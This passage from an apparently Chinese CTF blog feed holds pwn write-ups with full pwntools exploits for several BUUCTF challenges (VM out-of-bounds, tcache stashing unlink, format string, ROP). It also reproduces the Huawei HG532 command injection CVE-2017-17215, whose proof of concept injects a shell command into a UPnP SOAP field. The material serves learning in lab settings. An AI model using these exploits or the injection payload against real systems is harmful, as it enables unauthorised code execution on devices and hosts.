class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span><br>fake_IO_FILE += p64(gadget2)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1c0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += flat(<br>p64(pop_rdi), p64(fake_addr - <span class="hljs-number">0x10</span>),<br>p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>p64(pop_rdx_rbx), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>p64(mprotect),<br>p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><span class="hljs-comment">#print(hex(libcbase))</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;gitf?&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>思科CVE-2020-3331</title>
    <link href="/2023/01/12/CVE-2020-3331/"/>
    <url>/2023/01/12/CVE-2020-3331/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buu寒假练习2</title>
    <link href="/2023/01/07/buu2/"/>
    <url>/2023/01/07/buu2/</url>
    
    <content type="html"><![CDATA[<h3 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h3><p>这道vmpwn题分析起来并不难，输入一个整数，最高位的一字节对应着指令，剩下三个字节就对应寄存器和操作数，而漏洞也是很经典的数组越界。</p><p>我自己刚开始写的时候总想着先将got表中的值泄漏出来，得到libc的基地址后方便去写入system函数地址，程序虽然提供了打印寄存器这个指令，但是打印后会立马退出execute函数，这样就无法进一步去修改了；看到其他大佬写的<a href="https://www.cnblogs.com/lemon629/p/13975686.html">wp</a>后才反应过来可以利用got表中地址的偏移同样可以去修改。</p><p>攻击思路：</p><ol><li>利用数组越界得到got表中的libc地址；</li><li>利用该地址加或者减去一段偏移得到<code>__free_hook-8</code>的地址；</li><li>将<code>__free_hook-8</code>的地址写入全局变量comment中；</li><li>退出execute函数打印寄存器的值，可以得到libc的基地址，利用程序最后会向comment中的地址写入值和free该地址的特点，写入字符串“&#x2F;bin&#x2F;sh”和system函数地址。</li></ol><p>​</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn1&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc6_2.23-0ubuntu10_amd64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25875</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendcode</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">if</span> num &gt; <span class="hljs-number">0x7fffffff</span> :<br>        num = <span class="hljs-number">0xffffffff</span> - num + <span class="hljs-number">1</span><br>        num = <span class="hljs-built_in">str</span>(num)<br>        num = <span class="hljs-string">&#x27;-&#x27;</span>+num<br>    <span class="hljs-keyword">else</span> :<br>        num = <span class="hljs-built_in">str</span>(num)<br>    <span class="hljs-keyword">return</span> num.encode()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;PCPC:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;SP:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;CODE SIZE:&#x27;</span>, <span class="hljs-string">b&#x27;20&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;CODE:&#x27;</span>)<br><br>p.sendline(sendcode(<span class="hljs-number">0x10000038</span>))    <span class="hljs-comment">#reg0 = 0x38</span><br>p.sendline(sendcode(<span class="hljs-number">0x80010200</span>))    <span class="hljs-comment">#reg1 = reg2 - reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x30040001</span>))    <span class="hljs-comment">#reg4 = memory[reg1]</span><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70010100</span>))    <span class="hljs-comment">#reg1 = reg1 + reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x30050001</span>))    <span class="hljs-comment">#reg5 = memory[reg1]</span><br><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010008</span>))    <span class="hljs-comment">#reg1 = 8</span><br>p.sendline(sendcode(<span class="hljs-number">0xc0000001</span>))    <span class="hljs-comment">#reg0 = reg0 &lt;&lt; reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010009</span>))    <span class="hljs-comment">#reg1 = 9</span><br>p.sendline(sendcode(<span class="hljs-number">0x70000001</span>))    <span class="hljs-comment">#reg0 = reg0 + reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010004</span>))    <span class="hljs-comment">#reg1 = 4</span><br>p.sendline(sendcode(<span class="hljs-number">0xc0000001</span>))    <span class="hljs-comment">#reg0 = reg0 &lt;&lt; reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70040400</span>))    <span class="hljs-comment">#reg4 = reg4 + reg0</span><br><br>p.sendline(sendcode(<span class="hljs-number">0x10000008</span>))    <span class="hljs-comment">#reg0 = 8</span><br>p.sendline(sendcode(<span class="hljs-number">0x80010200</span>))    <span class="hljs-comment">#reg1 = reg2 - reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x40040001</span>))    <span class="hljs-comment">#memory[reg1] = reg4</span><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70010100</span>))    <span class="hljs-comment">#reg1 = reg1 + reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x40050001</span>))    <span class="hljs-comment">#memory[reg1] = reg5</span><br><br><span class="hljs-comment">#p.sendline(sendcode(0xff000000))</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;R4: &#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;R5: &#x27;</span>)<br>leak = (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span>) + leak<br>libcbase = leak + <span class="hljs-number">8</span> - libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;?\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><h3 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h3><p>程序主要通过calloc分配堆块，分配时不会从tcache取出chunk；虽然有malloc函数，但必须满足<code>tcache_perthread_struct</code>中0x220大小的chunk的数量至少为7才可使用malloc分配，这样就无法直接去利用tcache去实现任意地址写。</p><p>Tcache Stashing Unlink Attack可以很好得解决上面的问题，具体请看：<a href="https://www.anquanke.com/post/id/198173">Tcache Stashing Unlink Attack利用思路-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>​</p><p>这道题的思路就是先申请5个0x220大小的chunk放入tcache中，得到2个0x220大小small chunk后再修改small bin的最后一个 chunk的bk值 ：</p><img src="/img/10/Screenshot_20230113_045944.png" style="zoom:67%;" /><p>再次使用calloc时，会将修改的bk值也当作是一个真正的chunk放入tcache中：</p><img src="/img/10/Screenshot_20230113_050011.png" style="zoom:67%;" /><p>​</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hitcon_ctf_2019_one_punch&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./hitcon_ctf_2019_one_punch&#x27;)</span><br>p =remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27110</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debut</span>(<span class="hljs-params">idx, name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rename</span>(<span class="hljs-params">idx, name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">retire</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;50056&#x27;</span>)<br>    p.send(content)<br><br>debut(<span class="hljs-number">0</span> ,<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x210</span>)<br>retire(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    rename(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">0</span>)<br><br>debut(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>retire(<span class="hljs-number">0</span>)<br>retire(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span> - <span class="hljs-number">0x220</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    rename(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x26542</span><br>pop_rsi = libcbase + <span class="hljs-number">0x26f9e</span><br>pop_rdx = libcbase + <span class="hljs-number">0x12bda6</span><br>pop_rax = libcbase + <span class="hljs-number">0x47cf8</span><br>syscall_ret = libcbase + <span class="hljs-number">0xcf6c5</span><br><br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf0</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>debut(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x240</span>)<br>retire(<span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    rename(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">2</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x320</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>rename(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">1</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x340</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x240</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x221</span>)  + p64(heap_addr + <span class="hljs-number">0x570</span>) + p64(malloc_hook - <span class="hljs-number">0x38</span>)<br>rename(<span class="hljs-number">2</span>, payload)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(libcbase + <span class="hljs-number">0x99540</span>)<br>backdoor(payload)<br><br>payload = flat(<br>    p64(pop_rdi), p64(heap_addr + <span class="hljs-number">0x580</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(heap_addr),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">0</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(heap_addr),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">1</span>),<br>    p64(syscall_ret)<br>)<br>payload = payload.ljust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>debut(<span class="hljs-number">1</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><h3 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman_2019_format"></a>xman_2019_format</h3><p>程序存在多个函数嵌套，而ebp中保存上一个函数栈的值，利用ebp的数据修改一定的偏移，将其指向返回地址，最后修改返回地址</p><p>​</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;xman_2019_format&#x27;</span>)<br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>num1 = <span class="hljs-number">0x38</span><br>num2 = <span class="hljs-number">0x39</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    payload = <span class="hljs-string">b&#x27;%10$p|&#x27;</span><br>    payload += <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num1 + <span class="hljs-number">4</span>).encode() + <span class="hljs-string">b&#x27;c%10$hhn|%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0xab</span>).encode() + <span class="hljs-string">b&#x27;c%18$hhn|%&#x27;</span> <br>    payload += <span class="hljs-built_in">str</span>(num2 + <span class="hljs-number">4</span>).encode() + <span class="hljs-string">b&#x27;c%10$hhn|%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85</span>).encode() + <span class="hljs-string">b&#x27;c%18$hhn&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    p.send(payload)<br>    p.recvuntil(<span class="hljs-string">b&#x27;58&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./xman_2019_format&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27991</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>简单复现CVE-2017-17215</title>
    <link href="/2023/01/01/CVE-2017-17215/"/>
    <url>/2023/01/01/CVE-2017-17215/</url>
    
    <content type="html"><![CDATA[<p>​</p><p>由于不想重新再开一个虚拟机，这里就直接使用<a href="https://github.com/VulnTotal-Team/IoT-vulhub">IoT-vulhub</a>这个项目来配置的环境。</p><p>CVE-2017-17215在项目中只能依赖于qemu-system启动，需要我们事先构建好相应qemu-system的docker镜像。华为 HG532路由器的固件是mips大端架构，所以先进入到<code>/baseImage/qemu-system/mips/images</code>下载好相应的qemu启动镜像，再去构建<code>qemu-system:mips</code>的docker镜像</p><img src="/img/9/Screenshot_20230108_021304.png" style="zoom: 80%;" /><p>最后按照项目的<a href="https://github.com/VulnTotal-Team/IoT-vulhub/tree/master/HUAWEI/CVE-2017-17215">教程</a>来就可以正常运行启动环境了。</p><p>​</p><p>这里是在docker中再去运行qemu-system，qemu-system中的ip在本机上是无法直接访问的，在使用ssh通过2345端口转发后，如果想使用本机的浏览器去访问路由登录界面也需要设置相应的代理</p><img src="/img/9/Screenshot_20230108_022129.png" style="zoom: 50%;" /><p>使用firefox直接去访问<code>http://192.168.2.2/</code>可能报错，需要在<code>about:config</code>中去更改security.tls.version.fallback-limit和security.tls.version.min</p><img src="/img/9/Screenshot_20230108_024054.png"  /><p>更改后就可以正常访问<code>http://192.168.2.2/</code>路由登录界面了</p><p>​</p><p>poc如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>headers = &#123;<br>    <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br>&#125;<br> <br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-string"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="hljs-string">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="hljs-string">   &lt;NewStatusURL&gt;;/bin/busybox ls;&lt;/NewStatusURL&gt;</span><br><span class="hljs-string">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="hljs-string">  &lt;/u:Upgrade&gt;</span><br><span class="hljs-string"> &lt;/s:Body&gt;</span><br><span class="hljs-string">&lt;/s:Envelope&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>response = requests.post(<span class="hljs-string">&#x27;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1&#x27;</span>,headers=headers,data=data)<br></code></pre></td></tr></table></figure><p>​</p><p>运行如下：</p><img src="/img/9/Screenshot_20230108_043234.jpg"  /><p>在此过程中，可以进入docker中使用tcdump去抓取流量，然后复制到本机中用Wireshark具体分析：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">tcpdump -i tap0 -w result.cap<br><br>docker cp <span class="hljs-number">74</span>d6970b35fb:<span class="hljs-regexp">/root/</span>result.cap <span class="hljs-regexp">/home/</span>kali/Desktop<br></code></pre></td></tr></table></figure><p>​</p><p>这个命令注入的实现是在&#x2F;bin&#x2F;upnp这个文件中的sub_40749c函数引发的，通过对NewStatusURL和NewDownloadURL字符串的交叉引用，很容易在binaryninja发现该函数</p><p><img src="/img/9/Screenshot_20230108_044959.png"></p><p>​</p><p>参考：</p><p><a href="https://www.iotsec-zone.com/article?id=187#%E8%AE%BE%E5%A4%87%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90">华为HG532 - CVE-2017-17215漏洞简析- IOTsec-Zone物联网安全社区</a></p><p>[<a href="https://bbs.kanxue.com/thread-274713.htm">原创]华为HG532路由器命令注入漏洞分析(CVE-2017-17215)-智能设备-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buu寒假练习1</title>
    <link href="/2022/12/30/buu1/"/>
    <url>/2022/12/30/buu1/</url>
    
    <content type="html"><![CDATA[<h3 id="ycb-2020-easy-heap"><a href="#ycb-2020-easy-heap" class="headerlink" title="ycb_2020_easy_heap"></a>ycb_2020_easy_heap</h3><p>程序在使用edit功能时出现了<code>&#39;\x00&#39;</code>字节溢出，很容易想到修改下一个chunk的prev_size 、size 和 PREV_INUSE标志位，让其与上边的unsorted chunk合并造成堆块重叠</p><img src="/img/8/Screenshot_20230101_012711.png" style="zoom: 80%;" /><p>​</p><p>然而这里是libc-2.30.so，会对合并的上一个chunk的size检查，与修改的prev_size对比，这样以前的方法就不能继续使用了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//_int_free中的检查片段</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while 